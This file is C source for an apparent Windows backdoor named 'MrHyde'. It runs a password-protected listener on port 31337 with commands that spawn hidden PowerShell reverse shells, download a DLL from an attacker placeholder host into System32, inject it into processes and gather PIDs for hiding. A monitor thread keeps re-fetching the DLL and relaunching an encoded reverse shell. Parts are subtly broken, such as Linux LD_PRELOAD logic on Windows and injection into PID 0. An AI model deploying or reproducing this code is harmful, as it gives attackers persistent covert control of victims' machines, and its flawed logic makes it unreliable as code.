#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <time.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 31337
#define BUFFER_SIZE 1024
#define MAX_COMMANDS 10
#define PID_FILE "C:\\Windows\\System32\\pid.txt"
#define HIDE_FILE "C:\\Windows\\System32\\hide.txt"
#define KEY_FILE "C:\\Windows\\System32\\key.txt"
#define PASSWORD "grisiscomebacksayknokknok"

typedef struct {
    char *command;
    char *description;
    int argc;
} Command;

typedef struct {
    char *data;
    size_t size;
    char *name;
} VirtualFile;

VirtualFile *mem_storage[MAX_COMMANDS];
size_t mem_storage_size = 0;
int is_alive = 1;
time_t start_date;
int should_monitor = 1;

Command commands[] = {
    {"WRITE", "write file to mem", 2},
    {"READ", "read file from mem/disk", 1},
    {"DELETE", "delete file from mem", 1},
    {"DIR", "list all files on mem", 0},
    {"HELP", "print this screen", 0},
    {"QUIT", "close this session", 0},
    {"REBOOT", "stopping and restarting the system", 0},
    {"SHUTDOWN", "close down the system", 0},
    {"UPTIME", "print how long the system has been running", 0},
    {"REV", "send a reverse shell to the ip/port passed like an argument", 0},
    {"CLEAN", "CLEAN MrHyde Rootkit", 0},
    {"STOP", "STOP MrHyde Rootkit", 0},
    {"START", "START MrHyde Rootkit", 0},
    {"HIDE", "Hide PIDs", 1},
    {"INFECT", "Infect with dll", 1},
    {"MRHYDE", "download dll mrhyde.dll", 1},
};



void elp() {
    char *current_ld_preload = getenv("LD_PRELOAD");
    if (current_ld_preload == NULL || strcmp(current_ld_preload, "C:\\Windows\\System32\\mrhyde.dll") != 0) {
        printf("LD_PRELOAD setted as C:\\Windows\\System32\\mrhyde.dll\n");

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            perror("CreateProcess failed");
            exit(EXIT_FAILURE);
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void ensure_pid_file_exists() {
    int max_attempts = 3;
    int current_attempt = 0;
    
    while (current_attempt < max_attempts) {
        FILE *file = fopen(PID_FILE, "r");
        
        if (file != NULL) {
            fclose(file);
            return;
        }
        
        char command[256];
        snprintf(command, sizeof(command), 
                "tasklist | findstr /I \"{lhost}\" | findstr /I \"{line}\" | findstr /I \"monrev\" | findstr /I \"{line}_service.sh\"");
        
        FILE *cmd = _popen(command, "r");
        if (cmd != NULL) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), cmd) != NULL) {
            }
            
            _pclose(cmd);
            return;
        }
        
        fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", 
                current_attempt + 1, strerror(errno));
        
        Sleep(1000 * (current_attempt + 1));
        current_attempt++;
    }
    
    fprintf(stderr, "Warning: Could not verify process status after %d attempts\n", 
            max_attempts);
}

void ensure_key_file_exists() {
    int max_attempts = 3;
    int current_attempt = 0;

    while (current_attempt < max_attempts) {
        FILE *file = fopen(KEY_FILE, "r");
        if (file != NULL) {
            
            fclose(file);
            return;
        }
        FILE *cmd = fopen(KEY_FILE, "w");
        if (cmd != NULL) {
            
            fclose(cmd);
            return;
        }
        fprintf(stderr, "Attempt %d: Failed to create key file. Error: %s\n", 
                current_attempt + 1, strerror(errno));
        Sleep(1000 * (current_attempt + 1));
        current_attempt++;
    }

    fprintf(stderr, "Warning: Could not create or verify key file after %d attempts\n", 
            max_attempts);
}

void ensure_hide_file_exists() {
    int max_attempts = 3;
    int current_attempt = 0;
    
    while (current_attempt < max_attempts) {
        FILE *file = fopen(HIDE_FILE, "r");
        
        if (file != NULL) {
            fclose(file);
            return;
        }
        
        FILE *cmd = fopen(HIDE_FILE, "w");
        if (cmd != NULL) {
            fclose(cmd);
            return;
        }
        
        fprintf(stderr, "Attempt %d: Failed to create hide file. Error: %s\n", 
                current_attempt + 1, strerror(errno));
        
        Sleep(1000 * (current_attempt + 1));
        current_attempt++;
    }
    
    fprintf(stderr, "Warning: Could not create or verify hide file after %d attempts\n", 
            max_attempts);
}

void infect_command() {
    
    HMODULE hModule = LoadLibrary("C:\\Windows\\System32\\mrhyde.dll");
    if (hModule == NULL) {
        perror("LoadLibrary failed");
        exit(EXIT_FAILURE);
    }
    
    DWORD targetProcessId = 0; 
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        perror("OpenProcess failed");
        exit(EXIT_FAILURE);
    }
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(hModule), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteMemory == NULL) {
        perror("VirtualAllocEx failed");
        CloseHandle(hProcess);
        exit(EXIT_FAILURE);
    }
    WriteProcessMemory(hProcess, remoteMemory, &hModule, sizeof(hModule), NULL);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, remoteMemory, 0, NULL);
    CloseHandle(hProcess);
}

DWORD WINAPI handle_client(LPVOID client_socket) {
    int sock = *(int *)client_socket;
    free(client_socket);
    char buffer[BUFFER_SIZE];
    char *token;
    char *args[MAX_COMMANDS];
    int argc;

    printf("Client connected\n");

    
    const char *welcome_msg = "Enter password: \n";
    if (send(sock, welcome_msg, strlen(welcome_msg), 0) < 0) {
        perror("send failed");
        closesocket(sock);
        return 0;
    }

    
    memset(buffer, 0, BUFFER_SIZE);
    
    
    int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) {
        if (bytes_received == 0) {
            printf("Client disconnected\n");
        } else {
            perror("recv failed");
        }
        closesocket(sock);
        return 0;
    }

    
    buffer[bytes_received] = '\0';
    printf("Password received: %s\n", buffer);

    
    buffer[strcspn(buffer, "\r\n")] = 0;
    
    if (strcmp(buffer, PASSWORD) != 0) {
        const char *error_msg = "Incorrect password. Connection closed.\n";
        send(sock, error_msg, strlen(error_msg), 0);
        closesocket(sock);
        return 0;
    }

    const char *success_msg = "LazyOs release 0.1.1\n%> ";
    send(sock, success_msg, strlen(success_msg), 0);

    while (is_alive) {
        memset(buffer, 0, BUFFER_SIZE);
        if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) break;

        token = strtok(buffer, " \n");
        argc = 0;
        while (token != NULL) {
            args[argc++] = token;
            token = strtok(NULL, " \n");
        }

        if (strcmp(args[0], "WRITE") == 0) {
            if (argc >= 3) {
                VirtualFile *file = malloc(sizeof(VirtualFile));
                file->data = strdup(args[2]);
                file->size = strlen(args[2]);
                file->name = strdup(args[1]);
                mem_storage[argc - 1] = file;
                mem_storage_size += file->size;
                send(sock, "WRITE: Saved to mem file\n%> ", 30, 0);
            } else {
                send(sock, "WRITE: Not enough parameters\n%> ", 33, 0);
            }
        } else if (strcmp(args[0], "READ") == 0) {
            if (argc >= 2) {
                for (int i = 0; i < MAX_COMMANDS; i++) {
                    if (mem_storage[i] != NULL && strcmp(mem_storage[i]->name, args[1]) == 0) {
                        send(sock, mem_storage[i]->data, mem_storage[i]->size, 0);
                        send(sock, "\n%> ", 4, 0);
                        break;
                    }
                }
                send(sock, "READ: File not found\n%> ", 24, 0);
            } else {
                send(sock, "READ: Not enough parameters\n%> ", 32, 0);
            }
        } else if (strcmp(args[0], "REV") == 0) {
            if (argc >= 2) {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                
                char command[BUFFER_SIZE];
                snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream \";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"", args[1], atoi(args[2]));
                printf("Executing command: %s\n", command);
                if (!CreateProcess(NULL, 
                                (LPSTR)command,  
                                NULL, 
                                NULL, 
                                FALSE, 
                                CREATE_NO_WINDOW, 
                                NULL, 
                                NULL, 
                                &si, 
                                &pi)) {
                    DWORD error = GetLastError(); 
                    fprintf(stderr, "CreateProcess failed with error %lu\n", error);
                    exit(EXIT_FAILURE);
                }
                
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                send(sock, "REV: Not enough parameters\n%> ", 31, 0);
            }
        } else if (strcmp(args[0], "DELETE") == 0) {
            if (argc >= 2) {
                for (int i = 0; i < MAX_COMMANDS; i++) {
                    if (mem_storage[i] != NULL && strcmp(mem_storage[i]->name, args[1]) == 0) {
                        mem_storage_size -= mem_storage[i]->size;
                        free(mem_storage[i]->data);
                        free(mem_storage[i]->name);
                        free(mem_storage[i]);
                        mem_storage[i] = NULL;
                        send(sock, "DELETE: Removed mem file\n%> ", 30, 0);
                        break;
                    }
                }
                send(sock, "DELETE: Unable to find mem file\n%> ", 36, 0);
            } else {
                send(sock, "DELETE: Not enough parameters\n%> ", 34, 0);
            }
        } else if (strcmp(args[0], "DIR") == 0) {
            char response[BUFFER_SIZE];
            snprintf(response, BUFFER_SIZE, "DIR: There are %d file(s) that sum to %zu bytes of memory\n", MAX_COMMANDS, mem_storage_size);
            send(sock, response, strlen(response), 0);
            for (int i = 0; i < MAX_COMMANDS; i++) {
                if (mem_storage[i] != NULL) {
                    snprintf(response, BUFFER_SIZE, "File: %s, Size: %zu bytes\n", mem_storage[i]->name, mem_storage[i]->size);
                    send(sock, response, strlen(response), 0);
                }
            }
            send(sock, "%> ", 3, 0);
        } else if (strcmp(args[0], "HELP") == 0) {
            char response[BUFFER_SIZE];
            snprintf(response, BUFFER_SIZE, "LazyOs release 0.1.1\n");
            send(sock, response, strlen(response), 0);
            for (int i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
                snprintf(response, BUFFER_SIZE, "%s: %s\n", commands[i].command, commands[i].description);
                send(sock, response, strlen(response), 0);
            }
            send(sock, "%> ", 3, 0);
        } else if (strcmp(args[0], "QUIT") == 0) {
            send(sock, "Bye!\n", 5, 0);
            break;
        } else if (strcmp(args[0], "MRHYDE") == 0) {
            send(sock, "Mr.Hyde!\n", 9, 0);
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            char command[BUFFER_SIZE];
            snprintf(command, BUFFER_SIZE, "cmd.exe /C powershell Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/mrhyde.dll -OutFile C:\\Windows\\System32\\mrhyde.dll`\"\"");
            if (!CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                perror("CreateProcess failed");
                exit(EXIT_FAILURE);
            }
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            break;
        } else if (strcmp(args[0], "REBOOT") == 0) {
            send(sock, "Server is rebooting!\n", 22, 0);
            is_alive = 0;
        } else if (strcmp(args[0], "STOP") == 0) {
            send(sock, "Server is stopping monitoring!\n", 31, 0);
            should_monitor = 0;
        } else if (strcmp(args[0], "START") == 0) {
            send(sock, "Server is starting monitoring!\n", 30, 0);
            should_monitor = 1;
        } else if (strcmp(args[0], "CLEAN") == 0) {
            send(sock, "Server is Cleaning!\n", 22, 0);
            _putenv_s("LD_PRELOAD", "");
            FILE *preload_file = fopen("C:\\Windows\\System32\\ld.so.preload", "w");
            if (preload_file) {
                fclose(preload_file);
            }
            if (remove("C:\\Windows\\System32\\mrhyde.dll") == 0) {
                send(sock, "File C:\\Windows\\System32\\mrhyde.dll deleted successfully.\n", 47, 0);
            } else {
                send(sock, "Failed to delete C:\\Windows\\System32\\mrhyde.dll.\n", 41, 0);
            }
            send(sock, "Cleaning completed.\n%> ", 27, 0);
        } else if (strcmp(args[0], "INFECT") == 0) {
            infect_command();
            send(sock, "INFECT: DLL injected into the target process\n%> ", 47, 0);
        } else if (strcmp(args[0], "HIDE") == 0) {
            send(sock, "Server is HIDE!\n", 22, 0);
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            char command[BUFFER_SIZE];
            snprintf(command, BUFFER_SIZE, "powershell -Command \"Get-Process | Where-Object { $_.Path -like '*{lhost}*' -or $_.Path -like '*{line}*' -or $_.Path -like '*{line}_service.sh*' } | ForEach-Object { echo $_.Id } | Out-File -FilePath C:\\Windows\\System32\\pid.txt\"");
            if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                perror("CreateProcess failed");
                exit(EXIT_FAILURE);
            }
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            send(sock, "KERNEL: Unknown command\n%> ", 28, 0);
        }
    }

    closesocket(sock);
    return 0;
}


DWORD WINAPI monitor_shell(LPVOID data) {
    while (1) {
        ensure_pid_file_exists();
        ensure_hide_file_exists();
        ensure_key_file_exists();
        if (!should_monitor) {
            Sleep(1000);
            continue;
        }
        int process_found = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            perror("CreateToolhelp32Snapshot");
            continue;
        }

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hSnapshot, &pe)) {
            CloseHandle(hSnapshot);
            continue;
        }

        do {
            if (strstr(pe.szExeFile, "{lhost}") != NULL || strstr(pe.szExeFile, "{line}") != NULL || strstr(pe.szExeFile, "{line}_service.sh") != NULL) {
                process_found = 1;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));

        CloseHandle(hSnapshot);

        char *ld_preload = getenv("LD_PRELOAD");
        if (ld_preload == NULL || strcmp(ld_preload, "C:\\Windows\\System32\\mrhyde.dll") != 0) {
            if (access("C:\\Windows\\System32\\mrhyde.dll", F_OK) != 0) {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                char command[BUFFER_SIZE];
                snprintf(command, BUFFER_SIZE, "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://{lhost}/mrhyde.dll', 'C:\\Windows\\System32\\mrhyde.dll')\"");
                if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                    perror("CreateProcess failed");
                    exit(EXIT_FAILURE);
                }
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
  
        }

        if (!process_found) {
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            char command[BUFFER_SIZE];
            int retry_count = 0;
            const int MAX_RETRIES = 3;  

            do {
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                
                snprintf(command, BUFFER_SIZE, "powershell -NoP -W Hidden -Enc JABTAHkAcgB0AGUAbgBkAC4AZQBzAHQAcgBpAG4AZwAuAEMAbwBtAGUAbgB0AC4AdwBsAHUAdAB5AC4AZQB4AHkAOgBTAHQAcgBpAG4AZwA= -NoLogo -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
                printf("Executing: %s\n", command);  
        
                if (!CreateProcess(NULL,
                                command,
                                NULL,
                                NULL,
                                FALSE,
                                CREATE_NO_WINDOW,
                                NULL,
                                NULL,
                                &si,
                                &pi)) {
                    DWORD error = GetLastError();
                    fprintf(stderr, "CreateProcess failed (attempt %d of %d) with error: %lu\n", 
                            retry_count + 1, MAX_RETRIES, error);
                    
                    if (++retry_count >= MAX_RETRIES) {
                        fprintf(stderr, "Max retries reached, continuing monitoring...\n");
                        break;  
                    }
            
                    Sleep(1000 * retry_count);  
                    continue;
                }

                
                WaitForSingleObject(pi.hProcess, 10000);  
                
                DWORD exitCode;
                if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
                    if (exitCode != 0) {
                        fprintf(stderr, "Process exited with code: %lu\n", exitCode);
                    }
                }

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                break;  
        
            } while (1);
        }
    }
}
int main() {
    WSADATA wsaData;
    while (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed - retrying in 5 seconds");
        Sleep(5000);  
    }

    SOCKET server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    HANDLE client_thread, mon_thread;

retry_socket:
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed - retrying in 5 seconds");
        Sleep(5000);
        goto retry_socket;
    }

    while (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&opt, sizeof(opt))) {
        perror("setsockopt - retrying");
        closesocket(server_fd);
        Sleep(5000);
        goto retry_socket;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

retry_bind:
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed - retrying in 5 seconds");
        closesocket(server_fd);
        Sleep(5000);
        goto retry_socket;
    }

    while (listen(server_fd, 3) < 0) {
        perror("listen failed - retrying");
        closesocket(server_fd);
        Sleep(5000);
        goto retry_socket;
    }

    time(&start_date);

retry_monitor:
    mon_thread = CreateThread(NULL, 0, monitor_shell, NULL, 0, NULL);
    if (mon_thread == NULL) {
        fprintf(stderr, "Error creating monitor thread - retrying in 5 seconds\n");
        Sleep(5000);
        goto retry_monitor;
    }

    printf("Monitoring started!\n");
    elp();
    
    while (is_alive) {
        printf("Waiting for connection...\n");
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
            perror("accept failed - continuing");
            Sleep(1000);  
            continue;
        }
        
        printf("Connection accepted\n"); 
        int *client_socket = malloc(sizeof(int));
        if (client_socket == NULL) {
            perror("malloc failed - skipping client");
            closesocket(new_socket);
            continue;
        }
        *client_socket = new_socket;

        client_thread = CreateThread(NULL, 0, handle_client, (void *)client_socket, 0, NULL);
        if (client_thread == NULL) {
            perror("could not create thread - skipping client");
            free(client_socket);
            closesocket(new_socket);
            continue;
        }

        CloseHandle(client_thread);
        elp();
    }

    WaitForSingleObject(mon_thread, INFINITE);
    closesocket(server_fd);
    WSACleanup();
    return 0;
}
